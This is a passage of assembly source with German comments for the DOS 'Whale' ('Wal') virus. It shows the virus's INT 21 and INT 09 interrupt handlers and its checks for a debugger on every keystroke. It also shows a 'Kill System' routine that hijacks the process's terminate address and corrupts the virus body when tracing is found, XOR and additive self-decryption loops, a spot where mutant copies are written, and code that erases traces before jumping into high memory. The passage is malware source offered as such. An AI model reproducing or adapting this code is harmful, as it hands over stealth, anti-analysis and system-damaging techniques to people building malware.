;=================================================================
;===================( Wird Åber PATCH )===========================
;=================================================================
                CALL    SetInt_AL       ; INT 01 auf INT 03 setzen
                CALL    POPALL
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                CALL    Patch_IBMDOS
                CALL    GetRegsFromVirstack
                CALL    Re_SET_Int_02
                POP     AX
                POP     BP              ; Stack putzen

                PUSH    BX
                PUSH    CX
                MOV     BX,PART_____1
                MOV     CX,LEN_PART_1
J04A5B:         XOR     BYTE PTR CS:[BX],8Eh
D_4A5E  EQU     $-1
                INC     BX
                LOOP    J04A5B
                POP     CX
                POP     BX
                IRET                    ; ENDE von INT 01 / Tracer
                DB      0E9h
;=====================================================================
;================================================( INT 21-Handler )===
;=====================================================================
J04A66:         OR      BYTE PTR CS:[PART_____1],00h  ; = D4BAC
                                           ; ist Wal schon DEkodiert ?
                JZ      J04A7F
                PUSH    BX                 ; Nein.
J04A6F:         PUSH    CX
                MOV     BX,PART_____1
                MOV     CX,LEN_PART_1
J04A76:         XOR     BYTE PTR CS:[BX],8EH
D_4A79  EQU     $-1
                INC     BX
                LOOP    J04A76
                POP     CX
                POP     BX
J04A7F:         JMP     J0458D
;=====================================================================
                DB      34h
;=====================================================================
;=======================(              INT 09-Handler             )===
;=======================( Bei jedem (!) Tastendruck wird geprÅft, )===
;=======================( ob ein Debugger am Werk ist !           )===
;=====================================================================
J04A83:         MDECODE 92
                CALL    Patch_INT_09   ; INT 9 restaurieren
                CALL    Debugger_Check ; Das ist der Witz dabei !!!
                PUSHF
                CALL    CS:[INT_09  ]  ; CALL INT 09
                CALL    Patch_INT_09   ; Int 9 wieder patchen
                MCODE   92
                IRET
;=======================================================()=========
                DB      0BCH
;=====================================================================
;=======================================( Save Original-Registers )===
;=====================================================================
SaveRegs:       MOV     CS:[D2575],SI
                MOV     CS:[D2577],DI
                MOV     CS:[D257B],DS
                MOV     CS:[D257D],ES
J04AB1:         MOV     CS:[D2579],AX
                MOV     CS:[D257F],CX
                MOV     CS:[D2581],BX
                MOV     CS:[D2590],DX
                RETN
                ;-----------------------------------------------------
                DB      0E8h
                DB      01h
;=====================================================================
;=============================( PATCHT vorhandenen INT 09-Handler )===
;=====================================================================
KeyBoard        DB      0
Patch_INT_09:   MDECODE 93
                CALL    SaveRegs
;-----------------------------------------------------------
                MOV     SI,Offset D2570
                LES     DI,CS:[INT_09  ]       ; GET original INT 09
                PUSH    CS
                POP     DS
                CLD
;---------------------------( Tauscht 5 Byte ab CS:D2570  -> ES:DI )--
                MOV     CX,0005h
J04ADD:         LODSB
                XCHG    AL,ES:[DI]
                MOV     [SI-01h],AL
                INC     DI
                LOOP    J04ADD
;----------------------------------------( anzeige )-------------------
                MOV     AX,0B800H
                MOV     ES,AX
                XOR     DI,DI
                CMP     byte ptr cs:[Offset Keyboard-Offset VirStart],1
                MOV     Byte ptr cs:[Offset Keyboard-Offset VirStart],0
                MOV     AX,432EH
                JZ      ToOriginal
                MOV     Byte ptr cs:[Offset Keyboard-Offset VirStart],1
                MOV     AX,4b57h
ToOriginal:     STOSW
;-----------------------------------------------------------
                CALL    RestoreRegs
                MCODE   93
                RETN
;=====================================================================
;====================================(    GET INT 01 + INT 03     )===
;====================================( Check, ob Debugger werkelt )===
;=====================================================================
Debugger_Check:
                MDECODE 94
                MOV     CS:[D2581],BX
                MOV     CS:[D257D],ES
                XOR     BX,BX
                MOV     ES,BX
                MOV     BX,ES:[0006h]           ; GET Offset von INT 01
                CMP     BX,CS:[D2447]
                JNB     J04B27                  ; TRACER   AM WERK
                MOV     BX,ES:[000Eh]           ; GET Offset von INT 03
                CMP     BX,CS:[D2447]
                JNB     J04B27                  ; DEBUGGER AM WERK
                MOV     ES,CS:[D257D]
                MOV     BX,CS:[D2581]
                JMP     J04B76
;=====================================================================
;=================================================( Kill System ! )===
;=====================================================================
J04B27:         POP     BX                       ; POP returnadresse
                CALL    PushALL
                CALL    Patch_IBMDOS             ; DOS patchen
                CALL    PopALL

                MOV     BX,CS:[D2581]
                MOV     ES,CS:[D257D]

                PUSHF
                CALL    CS:[INT_09  ]             ; CALL INT 09

                CALL    PushALL

                MOV     AH,51h                    ; get current PSP
                CALL    CS:[@INT21]

                MOV     ES,BX
J04B4D:
                MOV     WORD PTR ES:[000Ch],0FFFFh; Terminate-Adresse
                MOV     WORD PTR ES:[000Ah],0000h ; ist FFFF:0000 !?!
                CALL    PopALL
                CALL    SaveRegs
                ;---------------------------------( Wal zerstîren )---
                MOV     CX,IfDebugWal   ; 1185h   ; 230Ah Byte
                MOV     BX,StartDebug   ; 004Fh   ; ab 4Fh / 285Fh
                MOV     AX,0802h        ; mit 0802h verORen
J04B6A:         OR      CS:[BX],AX      ; bis 4B69 , logisch, oder ....
                ADD     BX,+02h
                LOOP    J04B6A
                ;----------------------------------------------------
                CALL    RestoreRegs
                IRET
;=====================================================================
;=========================================( Kein Debugger am Werk )===
;=====================================================================
J04B76:         MCODE   94
                RET
D4B7C:          DB      0E8h
;=====================================================================
;=========( Verwischt Spuren und springt in oberen Speicherbereich)===
;=====================================================================
Schwimme_Fort:  OR      BYTE PTR CS:[BX],15h ; CX = 236Ch
                INC     BX                   ; BX = 0
                LOOP    Schwimme_Fort        ; also von 2810 bis D4B7C
                                             ; alles lîschen
                RETF                         ; RETF nach
                                             ; Oberen-Speicher:01B1
                                             ; Identisch mit CS:29C1
;=====================================================================
;========================================( Get Original-Registers )===
;=====================================================================
RestoreRegs:    MOV     AX,CS:[D2579]
                MOV     ES,CS:[D257D]
                MOV     DS,CS:[D257B]
                MOV     SI,CS:[D2575]
                MOV     DI,CS:[D2577]
                MOV     CX,CS:[D257F]
                MOV     BX,CS:[D2581]
                MOV     DX,CS:[D2590]
L0L0L0:         RETN
;----------------------------------------------------------------------
D4BAC           DB      00h          ; Signal-Byte zur Erkennung,
                                     ; ob Wal dekodiert ist oder nicht
;=====================================================================
;=============================================( VerschlÅsselt WAL )===
;=====================================================================
Code_Whale:     PUSH    CX
                PUSH    BX
                MOV     BX,FirstByte
                MOV     CX,Code_len     ; 2385h ; Wal-Size
LASTCODE:       ;^^^^^^^^^^^-- LETZTES VERSCHLUESSELTE BYTE        !
;---------------------------------------------------------------------
D4BB5:          ;vvvvvvvvvvv-- HIERHER WERDEN DIE MUTANTEN KOPIERT !
                PUSH    DX
                MOV     DH,[BX-01h]
J04BB9:         MOV     DL,[BX    ]
                ADD     [BX],DH
                XCHG    DL,DH
                INC     BX
                LOOP    J04BB9

                POP     DX
                POP     BX
                POP     CX
                PUSH    SI
                MOV     SI,2567h
                DEC     SI
                CALL    [SI]            ; CALL INT 21h
;=====================================================================
;============================================( Normaler Einsprung )===
;=====================================================================
Decode_Whale:   CALL    J04BD1
J04BCF:         XOR     BX,SI           ; DUMMY !
J04BD1:         XOR     SI,1876h        ; SI = 1876, kann immer
                                        ; geÑndert werden
                POP     BX              ; BX = 4BCF
                POP     SI
                SUB     BX,Code_start   ; BX = 2830
                MOV     CX,Code_Len     ; CX = 2385 wal-size
                PUSH    CS
                POP     DS
J04BE0:         MOV     AL,[BX-01h]
                SUB     [BX],AL
                INC     BX
                LOOP    J04BE0
                                        ; BX = 4BB5
                ADD     BX,008Eh        ; BX = 4C43 / 2433
                XCHG    SI,BX
                DEC     BYTE Ptr DS:[SI]
                JNZ     J04BF5
                XCHG    BX,SI
                RETN                    ;
;=====================================================================
;==============================================( Sprung zu ENTRY )===
;=====================================================================
J04BF5:         PUSH    ES              ; SI ist 4C43
                XOR     AX,AX
                POP     DS
                JMP     ENTRY
;=====================================================================
;==========================================================( ENDE )===
;=====================================================================
                DW      0CE8BH
                DW      05605H
LASTBYTE:       DB         34H

J04C01:         DW      00045h
                DW      05000h
                DW      0DCE3h
                DW      09000h
                DW      00000h
                DW      01F00H
                DW      02000H
                DB      10H
;============================================================================
code    ENDS
        END  start

